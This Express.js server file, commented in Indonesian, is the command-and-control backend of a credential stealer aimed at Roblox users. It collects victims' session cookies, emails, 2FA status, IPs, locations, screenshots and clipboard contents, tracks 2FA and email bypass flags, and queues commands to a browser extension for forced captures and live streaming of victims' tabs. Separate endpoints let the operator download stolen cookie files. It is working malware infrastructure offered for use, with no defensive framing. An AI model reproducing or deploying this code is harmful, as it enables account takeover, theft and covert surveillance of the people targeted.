const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ========== API KEY CONFIG ==========
// Simpan API key di .env sebagai: API_KEY=sk_live_xxxxxxxxxxxx
const VALID_API_KEY = process.env.API_KEY;

if (!VALID_API_KEY) {
    console.error('❌ FATAL: API_KEY tidak ditemukan di .env! Server tidak akan berjalan.');
    process.exit(1);
}

// ========== MIDDLEWARE API KEY ==========
// Semua endpoint /api/* KECUALI /api/dashboard tidak butuh auth
function requireApiKey(req, res, next) {
    const apiKey = req.headers['x-api-key'];

    if (!apiKey) {
        return res.status(401).json({ 
            success: false, 
            error: 'API key diperlukan. Sertakan header: x-api-key' 
        });
    }

    if (apiKey !== VALID_API_KEY) {
        console.warn(`⚠️ API key salah dari IP: ${req.ip} | Key: ${apiKey.substring(0, 10)}...`);
        return res.status(403).json({ 
            success: false, 
            error: 'API key tidak valid' 
        });
    }

    next(); // Key benar, lanjut
}

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

// ========== CONFIG ENDPOINT (khusus dashboard, tanpa auth) ==========
// Hanya bisa diakses dari browser yang buka dashboard kamu
app.get('/config', (req, res) => {
    res.json({ apiKey: VALID_API_KEY });
});

const DATA_FILE = process.env.DATA_PATH || path.join(__dirname, 'accounts.json');
const dataDir = path.dirname(DATA_FILE);
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({
        accounts: [],
        logs: [],
        stats: { totalAccounts: 0, totalRobux: 0, lastUpdate: null }
    }, null, 2));
}

// ========== POLLING MECHANISM ==========
const pollRequests = new Map();

function readData() {
    try {
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        if (!raw || raw.trim() === '' || raw.trim() === '[]' || raw.trim() === '{}') {
            return { accounts: [], logs: [], stats: { totalAccounts: 0, totalRobux: 0, lastUpdate: null } };
        }
        const parsed = JSON.parse(raw);
        if (!parsed.accounts) parsed.accounts = [];
        if (!parsed.logs) parsed.logs = [];
        if (!parsed.stats) parsed.stats = { totalAccounts: 0, totalRobux: 0, lastUpdate: null };
        return parsed;
    } catch (e) {
        return { accounts: [], logs: [], stats: { totalAccounts: 0, totalRobux: 0, lastUpdate: null } };
    }
}

function writeData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// ========== SEMUA ROUTE /api/* DILINDUNGI API KEY ==========
// Terapkan middleware ke semua /api/*
app.use('/api', requireApiKey);

// ========== RECEIVE ACCOUNT DATA ==========
app.post('/api/account', async (req, res) => {
    try {
        const accountData = req.body;
        if (!accountData.userId) {
            const data = readData();
            data.logs.push({
                type: accountData.type || 'unknown',
                receivedAt: new Date().toISOString(),
                ip: req.ip,
                payload: JSON.stringify(accountData).substring(0, 500)
            });
            if (data.logs.length > 500) data.logs = data.logs.slice(-500);
            writeData(data);
            return res.json({ success: true, message: 'Logged (no userId)' });
        }

        const data = readData();
        accountData.receivedAt = new Date().toISOString();
        accountData.id = String(accountData.userId);
        accountData.ip = req.ip || req.connection.remoteAddress;

        // Track deviceId -> userId mapping untuk command routing
        if (accountData.deviceId) {
            deviceToUser.set(accountData.deviceId, String(accountData.userId));
            if (!commandsQueue.has(accountData.deviceId)) {
                commandsQueue.set(accountData.deviceId, []);
            }
        }

        const { screenshot, clipboard, ip, location, device, ...rest } = accountData;

        const existingIndex = data.accounts.findIndex(acc => String(acc.userId) === String(accountData.userId));

        const newAccount = {
            ...rest,
            userId: accountData.userId,
            username: accountData.username,
            displayName: accountData.displayName,
            robux: accountData.robux || 0,
            friends: accountData.friends || 0,
            premium: accountData.premium || false,
            accountAge: accountData.accountAge || 'N/A',
            email: accountData.email || 'Hidden',
            emailVerified: accountData.emailVerified || false,
            twoFAEnabled: accountData.twoFAEnabled || false,
            inventoryValue: accountData.inventoryValue || 0,
            inventoryCount: accountData.inventoryCount || 0,
            badgesCount: accountData.badgesCount || 0,
            groupsCount: accountData.groupsCount || 0,
            limiteds: accountData.limiteds || 0,
            cookie: accountData.cookie || '',
            ip: ip || 'Unknown',
            location: location || { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown' },
            device: device || { platform: 'Unknown', userAgent: 'Unknown', language: 'Unknown', cores: 'Unknown' },
            screenshot: screenshot || null,
            clipboard: clipboard || { text: '', hasData: false },
            bypass2FA: accountData.bypass2FA || false,
            bypassEmail: accountData.bypassEmail || false,
            createdAt: accountData.createdAt || new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        if (existingIndex !== -1) {
            const old = data.accounts[existingIndex];
            data.accounts[existingIndex] = {
                ...old,
                ...newAccount,
                createdAt: old.createdAt || newAccount.createdAt,
                updatedAt: new Date().toISOString()
            };
        } else {
            data.accounts.push(newAccount);
            data.stats.totalAccounts = data.accounts.length;
        }

        data.stats.totalRobux = data.accounts.reduce((sum, acc) => sum + (Number(acc.robux) || 0), 0);
        data.stats.lastUpdate = new Date().toISOString();

        data.logs.push({
            type: 'account_received',
            userId: accountData.userId,
            username: accountData.username,
            timestamp: new Date().toISOString(),
            ip: req.ip
        });
        if (data.logs.length > 500) data.logs = data.logs.slice(-500);

        writeData(data);
        console.log(`✅ Account received: ${accountData.username}`);
        res.json({ success: true, message: existingIndex !== -1 ? 'Account updated' : 'Account saved' });

    } catch (error) {
        console.error('❌ Error saving account:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== POLLING ENDPOINT ==========
app.post('/api/poll', (req, res) => {
    try {
        const { deviceId } = req.body;
        
        if (!deviceId) {
            return res.json({ 
                action: 'capture',
                reason: 'No device ID - force capture'
            });
        }

        const hasRequest = pollRequests.has(deviceId);
        
        if (hasRequest) {
            pollRequests.delete(deviceId);
            console.log(`📤 Poll: Sending capture command to device ${deviceId}`);
            return res.json({ 
                action: 'capture',
                reason: 'Requested by server'
            });
        }

        console.log(`📤 Poll: Routine capture for device ${deviceId}`);
        res.json({ 
            action: 'capture',
            reason: 'Routine check'
        });

    } catch (error) {
        console.error('❌ Poll error:', error);
        res.json({ action: 'wait', reason: 'Error' });
    }
});

// ========== FORCE CAPTURE ENDPOINT ==========
app.post('/api/force-capture', (req, res) => {
    try {
        const { deviceId } = req.body;
        
        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'deviceId required' });
        }

        pollRequests.set(deviceId, { 
            timestamp: new Date().toISOString(),
            reason: 'Manual force'
        });

        console.log(`🔥 Force capture requested for device ${deviceId}`);
        res.json({ 
            success: true, 
            message: 'Capture will be triggered on next poll',
            deviceId 
        });

    } catch (error) {
        console.error('❌ Force capture error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== GET ALL ACCOUNTS ==========
app.get('/api/accounts', (req, res) => {
    try {
        const data = readData();
        res.json({
            success: true,
            accounts: data.accounts,
            stats: data.stats,
            total: data.accounts.length
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== GET SINGLE ACCOUNT ==========
app.get('/api/account/:id', (req, res) => {
    try {
        const data = readData();
        const account = data.accounts.find(a => String(a.userId) === String(req.params.id));
        if (account) res.json({ success: true, account });
        else res.status(404).json({ success: false, error: 'Not found' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== DELETE ACCOUNT ==========
app.delete('/api/account/:id', (req, res) => {
    try {
        const data = readData();
        data.accounts = data.accounts.filter(a => String(a.userId) !== String(req.params.id));
        data.stats.totalAccounts = data.accounts.length;
        data.stats.totalRobux = data.accounts.reduce((sum, acc) => sum + (Number(acc.robux) || 0), 0);
        data.logs.push({ type: 'account_deleted', userId: req.params.id, timestamp: new Date().toISOString() });
        if (data.logs.length > 500) data.logs = data.logs.slice(-500);
        writeData(data);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});



// ========== COMMANDS QUEUE — per deviceId ==========
const commandsQueue = new Map(); // deviceId -> [cmd, cmd, ...]
const liveFrames = new Map();    // userId -> { frame, ts, tabUrl, tabTitle }
const deviceToUser = new Map();  // deviceId -> userId (untuk track siapa yg dipanggil)

// POST /api/commands/:deviceId — extension poll perintah
app.get('/api/commands/:deviceId', (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const cmds = commandsQueue.get(deviceId) || [];
        commandsQueue.set(deviceId, []); // clear setelah dikirim
        res.json({ success: true, commands: cmds });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/request-screenshot/:userId — dashboard minta refresh screenshot
app.post('/api/request-screenshot/:userId', (req, res) => {
    try {
        const userId = String(req.params.userId);
        // Cari deviceId yang terhubung ke userId ini
        let targetDevice = null;
        for (const [devId, uid] of deviceToUser.entries()) {
            if (String(uid) === userId) { targetDevice = devId; break; }
        }
        // Kalau tidak ketemu, broadcast ke semua device yang ada
        if (!targetDevice) {
            for (const [devId] of commandsQueue.entries()) {
                const q = commandsQueue.get(devId) || [];
                q.push({ action: 'refresh_screenshot', userId, ts: Date.now() });
                commandsQueue.set(devId, q);
            }
        } else {
            const q = commandsQueue.get(targetDevice) || [];
            q.push({ action: 'refresh_screenshot', userId, ts: Date.now() });
            commandsQueue.set(targetDevice, q);
        }
        res.json({ success: true, message: 'Screenshot request queued' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/live-start/:userId — dashboard minta mulai live stream
app.post('/api/live-start/:userId', (req, res) => {
    try {
        const userId = String(req.params.userId);
        const { deviceId } = req.body;
        const targetDev = deviceId || null;

        const pushCmd = (devId) => {
            const q = commandsQueue.get(devId) || [];
            q.push({ action: 'live_on', userId, ts: Date.now() });
            commandsQueue.set(devId, q);
            deviceToUser.set(devId, userId);
        };

        if (targetDev) {
            pushCmd(targetDev);
        } else {
            // Broadcast
            for (const [devId] of commandsQueue.entries()) pushCmd(devId);
            // Kalau belum ada device terdaftar, buat entry kosong agar polling nanti ambil
            if (commandsQueue.size === 0) {
                commandsQueue.set('broadcast', [{ action: 'live_on', userId, ts: Date.now() }]);
            }
        }

        console.log(`📡 Live start untuk userId ${userId}`);
        res.json({ success: true, message: 'Live stream command sent' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/live-stop/:userId — dashboard minta stop live stream
app.post('/api/live-stop/:userId', (req, res) => {
    try {
        const userId = String(req.params.userId);
        for (const [devId] of commandsQueue.entries()) {
            const q = commandsQueue.get(devId) || [];
            q.push({ action: 'live_off', ts: Date.now() });
            commandsQueue.set(devId, q);
        }
        liveFrames.delete(userId);
        console.log(`📡 Live stop untuk userId ${userId}`);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/live-frame/:userId — extension kirim frame
app.post('/api/live-frame/:userId', (req, res) => {
    try {
        const userId = String(req.params.userId);
        const { frame, deviceId, tabUrl, tabTitle, ts } = req.body;
        if (!frame) return res.status(400).json({ success: false, error: 'frame required' });

        // Track deviceId -> userId
        if (deviceId) deviceToUser.set(deviceId, userId);
        // Juga pastikan device sudah terdaftar di commandsQueue
        if (deviceId && !commandsQueue.has(deviceId)) commandsQueue.set(deviceId, []);

        liveFrames.set(userId, { frame, tabUrl, tabTitle, ts: ts || Date.now() });
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// GET /api/live-frame/:userId — dashboard ambil frame terbaru
app.get('/api/live-frame/:userId', (req, res) => {
    try {
        const userId = String(req.params.userId);
        const entry = liveFrames.get(userId);
        if (!entry) {
            return res.json({ success: false, ready: false });
        }
        const age = Date.now() - (entry.ts || 0);
        // Kalau frame lebih dari 5 detik = stale
        if (age > 5000) {
            return res.json({ success: false, ready: false, stale: true });
        }
        res.json({ success: true, ready: true, frame: entry.frame, tabUrl: entry.tabUrl, tabTitle: entry.tabTitle, ts: entry.ts });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ========== COOKIES STORAGE (in-memory per userId) ==========
const cookiesStore = new Map(); // userId -> { cookieText, totalCount, capturedAt }

// POST /api/cookies/:userId — terima cookies dari extension
app.post('/api/cookies/:userId', (req, res) => {
    try {
        const userId = req.params.userId;
        const { cookieText, totalCount, capturedAt } = req.body;

        if (!cookieText) {
            return res.status(400).json({ success: false, error: 'cookieText diperlukan' });
        }

        cookiesStore.set(String(userId), {
            cookieText,
            totalCount: totalCount || 0,
            capturedAt: capturedAt || new Date().toISOString()
        });

        console.log(`🍪 Cookies disimpan untuk userId ${userId} (${totalCount} cookies)`);
        res.json({ success: true, message: 'Cookies tersimpan', totalCount });

    } catch (error) {
        console.error('❌ Error simpan cookies:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// GET /api/cookies/:userId — download file cookies sebagai .txt
app.get('/api/cookies/:userId', (req, res) => {
    try {
        const userId = req.params.userId;
        const entry = cookiesStore.get(String(userId));

        if (!entry) {
            return res.status(404).json({ success: false, error: 'Cookies belum di-grab untuk akun ini' });
        }

        // Cari username dari accounts
        const data = readData();
        const account = data.accounts.find(a => String(a.userId) === String(userId));
        const username = account?.username || userId;

        const filename = `cookies_${username}_${userId}.txt`;
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.send(entry.cookieText);

    } catch (error) {
        console.error('❌ Error download cookies:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// GET /api/cookies/:userId/info — cek status grab (untuk polling dari dashboard)
app.get('/api/cookies/:userId/info', (req, res) => {
    try {
        const userId = req.params.userId;
        const entry = cookiesStore.get(String(userId));

        if (!entry) {
            return res.json({ success: true, ready: false });
        }

        res.json({
            success: true,
            ready: true,
            totalCount: entry.totalCount,
            capturedAt: entry.capturedAt
        });

    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== GET STATS ==========
app.get('/api/stats', (req, res) => {
    try {
        const data = readData();
        res.json({
            success: true,
            stats: data.stats,
            recentLogs: data.logs.slice(-20),
            pollRequests: Array.from(pollRequests.entries())
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== DASHBOARD (tidak perlu API key — ini buat kamu buka di browser) ==========
app.get('/dashboard', (req, res) => {
    const htmlPath = path.join(__dirname, 'public', 'dashboard.html');
    if (fs.existsSync(htmlPath)) res.sendFile(htmlPath);
    else res.json({ message: 'Dashboard HTML not found' });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🔑 API Key protection: AKTIF`);
    console.log(`📁 Data file: ${DATA_FILE}`);
    console.log(`📡 Semua /api/* butuh header: x-api-key`);
});
